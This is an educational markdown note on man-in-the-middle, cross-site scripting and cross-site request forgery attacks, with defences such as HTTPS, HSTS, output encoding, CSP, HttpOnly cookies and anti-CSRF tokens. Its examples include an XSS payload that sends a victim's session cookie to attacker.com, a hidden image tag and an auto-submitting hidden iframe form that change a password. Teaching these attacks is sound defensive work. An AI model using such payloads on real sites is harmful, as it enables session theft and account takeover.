# Attacks

Types of attack, and how to defend against each of them: 

## Man In The Middle (MITM)

![man in the middle](https://media0.giphy.com/media/yddCKJ3vmNp5K/giphy.gif?cid=3640f6095c0fcf34664155672eedd41a)

A MITM attack happens when a communication between _two systems is intercepted_ by an **outside** entity. 

This can happen in any form of online communication, such as:
- email
- social media
- web surfing, etc. 

Not only are they trying to eavesdrop on your private conversations, they can also target **all** the information inside your devices.

### Types of Hijacking

```Email Hijacking```: 

These types of attacks are most likely performed on large organisations, more commonly - financial companies.

Once they gain access to important email accounts, they will monitor the transactions to make their eventual attack a lot more convincing.

> <u>Example</u>
They can wait for a scenario where the customer will be sending money and respond, spoofing the company’s email address, with their own bank details instead of the company’s. This way, the customer thinks they’re sending their payment to the company, but they’re really sending it right to the hacker.

```Wi-Fi Eavesdropping```:

Most MITM attacks thrive on Wi-Fi connections.
There are 2 main approaches: 
1. The hacker will set up a Wi-Fi connection with a **legitimate-sounding name**. All the hacker has to do is wait for you to connect and he’ll instantly have access to your device
2. The hacker can create a **fake Wi-Fi node** disguised as a legitimate Wi-Fi access point to steal the personal information of everyone who connects.

```Session Hijacking```
* Once you log into a website, a connection between your computer and the website is established. 
* Hackers can hijack your session with the website through numerous means. 
* One popular option they use is stealing your browser cookies

It can be your online activity, login credentials, pre-fill forms, and in some cases, your location. If they got hold of your login cookies, they can easily log into your accounts and assume your identity

### How Can You Protect Your Networks from These Attacks?

1. ```S/MIME```
**Secure/Multipurpose Internet Mail Extensions**(S/MIME), encrypts your emails at _rest_ or _in transit_, ensuring only intended recipients can read them and leaving no spaces for hackers to slip their way in and alter your messages.

3. ```Authentication Certificates```
By implementing Certificate-Based Authentication for all employee machines and devices. This means only endpoints with properly configured certificates can access your systems and networks.

### Preventing HTTP Inception
1. ```SSL/TLS Certificates```
A TLS Certificate will activate the HTTPS protocol, which is the safer version of HTTP. 

    This allows an encrypted, secure connection between your server and your clients’ computers, keeping all information from prying hackers.

    This can boost trust among your visitors that your site is legitimately operated by your company and not an imposter site.

4. ```System and Server Configurations```
Once TLS is up and running, you need to do some configuring.

    Make sure your login forms are HTTPS-protected to avoid credential hijacking.
    
    It’s also good practice to make sure any links you are pulling in from other sites are via HTTPS.
6. ```HSTS over HTTPS```
Hackers have found ways to get around TLS.

    ><u>Example</u>
Event if you request an HTTPS connection (e.g. you type in https://www.example.com), they can change the request to HTTP so you go to http://www.example.com, preventing the encrypted connection.


    Implementing HTTP Strict Transport Security or HSTS can help prevent this type of attack.
    
    HSTS will also prevent hackers from extracting information from your browser cookies, effectively defending your website from session hijackers

## Cross Site Scripting (XSS)

Using XSS, an attacker can **modify the webpages that other users see in your application**. 

Can be used to: 
- steal information such as passwords and credit cards
- spread bogus data
- hijack user sessions
- redirect to another site
- execute malicious scripts in the victim’s browser

> XSS should be named **HTML Injection** Attack

The danger with XSS is: The attacker sneaks some malicious JavaScript (usually via a `<script>` tag) into your html which is then executed.

This vulnerability may occur whenever untrusted data is included in a web page or response, without proper validation or sanitization. The attacker can submit forms with HTML or JavaScript fragments, which will be embedded directly in the page and rendered by the browser.

For example, this server code:

```js
response.write(“Good morning, ” + request.getParameter(“Name”));
```

embeds the user’s `Name` parameter directly into the output. This is intended to return the following page, if the user’s name is “John”:

> Good Morning, John

Instead, an attacker can inject a malicious payload:

```js
Good Morning, Boss<script>document.location=’http://attacker.com/?cookie=’+document.cookie</script>
```

which will be executed by the user’s browser, sending their session cookie to the attacker and allowing the attacker to hijack the session.

### How to defend your website against XXS: 

> Treat any user input as unsafe!
- **Client side validation**
- **Use of proper encoding**: For example, HTML encoding will turn all “special” characters into HTML entities, such that they are displayed the same to the user but are **not recognized by the parser as valid HTML tags**. Most modern web platforms provide this functionality automatically or as a function call, and there are plenty of security libraries for those that do not.
- **Escape HTML, JS and CSS output**: Untrusted data that is sent down to the browser might get executed instead of just being displayed. Mitigate this by using dedicated libraries that explicitly **mark the data as pure content that should never get executed** (i.e. encoding, escaping). 
- Additionally, it is a good idea to **Implement Content Security Policy (CSP)**, to prevent the browser from rendering an XSS attack that got through. 
    - To enable CSP, you need to **configure your web server to return the `Content-Security-Policy` HTTP header**. You will see `X-WebKit-CSP` and `X-Content-Security-Policy` headers in various tutorials on the web. Going forward, you should ignore these prefixed headers. Modern browsers (with the exception of IE) support the unprefixed `Content-Security-Policy` header. That's the header you should use. [content-security-policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
    - Alternatively, the `<meta>` element can be used to configure a policy, for example: 

```html
<meta http-equiv="Content-Security-Policy" 
content="default-src 'self'; img-src https://*; child-src 'none';">
```

- Also, **configure your session cookies (either in your application code or in the web server configuration)** to include the `HttpOnly` attribute, from preventing successful XSS exploits from hijacking your users’ sessions. `HttpOnly` tells the browser that this particular cookie should only be accessed by the server. Any attempt to access the cookie from client script is strictly forbidden.
- **Eval is Evil!**: An attacker could be using the `eval()` in your script as a means to pass malicious code to your site in order to exploit the current user's session in someway (e.g. a user following a malicious link). The danger of `eval()` is when it is executed on **unsanitised values**, and can lead to a DOM Based XSS vulnerability. 

```js
const api_key = "secret value!";

const testFunc = (userName) => {
    eval(userName);
    return false;
}
testFunc('alert("You have been hacked! api_key is: ' + api_key + '");');
```


## Cross Site Request Forgery (CSRF)

![forgery](https://media2.giphy.com/media/xT5LMM07p6oX0EzDC8/giphy.gif?cid=3640f6095c0fd02a636f6c71367f8a28)

**Sources:**
- [owasp.org](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
- [Computerphile](https://www.youtube.com/watch?v=vRBihr41JTo)
- [acunetix](https://www.acunetix.com/blog/articles/cross-site-request-forgery/)

### About CSRF
- **CSRF** forces the user to execute unwanted actions on a web application in which they're currently authenticated
- Targets **state changing requests** specifically
- The attacker cannot see the response of the forged request.
- The lesser known of the 3 major attacks after SQL injection and XXS.
- Can be performed in both GET and POST requests.

### How is it carried out?
1. The user clicks on a link sent in an email or chat, and their identity / account in the web application is hacked. The user will be tricked into clicking the link through use of _social engineering_ - e.g. clicking a link in a fake email, posing as a well-known brand.
2. The user is forced into sending **malicious state changing requests**, for example if the user is a:
    - **Regular User** - funds can be transfered, email addresses changed, and all other details associated with the account can be changed or stolen.
    - **Admin User** - could compromise the entire web application.

### Key Points:
- Uses cookies
- If a user is currently authenticated (logged in) to a site, the site will have no way to distinguish between a forged and a genuine request sent by the victim.
- Will work in between any tabs you may have open.
- A malicious site can hijack a POST request from another tab - e.g. your online bank account.
- CSRF is probably the reason why you encrypt your cookies, and set expiry dates.
- CSRF requests target functionality that causes **state change on the server**, e.g. changing details such as email address and password
- The victim, not the attacker receives the response of the attack
- It is possible to store the CSRF attack on the vulnerable site itself. Vulnerabilities are also known as **stored CSRF flaws**. In such a case, the severity of the attack becomes amplified.

### Stored CSRF flaws :floppy_disk:
...and how to mitigate against them. Examples include:

- IMG and IFRAME tags in an input field that accepts HTML
- Vulnerabilities that allow **cross-site scripting** attacks to be run on the site

---

### Prevention measures that don't work include: :x: 

- Using a secret cookie
- Only accepting POST requests
- Multi-Step Transactions
- URL Rewriting
- Https (though this is a prerquisite to effective prevention measures)

### Prevention measures that do work: :white_check_mark:

- Make your forms send an authentication token - ensure that the info coming back is legit and not forged
- Make sure authentication tokens have an expiry time that isn't too far into the future
- Synchronise cookies with anti CSRF _synchronisation tokens_
- Prevent browser from sending cookies to the web application
- Use same-site cookies, which prevent third party cookies

![cookies](https://media3.giphy.com/media/xT0xeMA62E1XIlup68/giphy.gif?cid=3640f6095c0fe4972f3971775971a1f0)

---


### GET request example

Your details can be stored in an `<img>` tag and hidden with css. Found on a malicious web page, message, email etc:
```html
<img src="http://example.com/changePassword.php/?newPassword=attackerPassword" style="visibility:hidden;">
```
In this case, the browser will send a GET request containing a cookie to the attacker url in the img tag


### POST request example

A post request may make use of an `<iframe>` element that will serve up another webpage through the document the victim is viewing. This iframe will contain a script that will submit the form that it contains. Like the image, the iframe may also be hidden from view.

**iframe**
```html
<iframe src="http://attacker.com/csrfAttack" style="width:0;height:0;border:0;border:none;"></iframe>
```

**iframe contents**
```html
<body onload="document.getElementById('csrf').submit()">
    <form id="csrf" action="http://example.com/changePassword.php" method="POST">
        <input name="newPassword" value="attackerPassword" />
    </form>
</body>
```